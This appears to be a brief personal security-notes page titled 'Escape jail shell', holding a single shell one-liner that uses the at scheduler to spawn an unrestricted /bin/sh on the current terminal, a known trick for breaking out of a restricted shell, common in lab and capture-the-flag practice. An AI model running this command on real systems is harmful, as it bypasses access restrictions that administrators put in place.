---
publish: true
created: 2026-02-06T17:08:03.006+05:30
modified: 2026-06-22T08:59:26.228+05:30
---

#### Escape jail shell

```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```
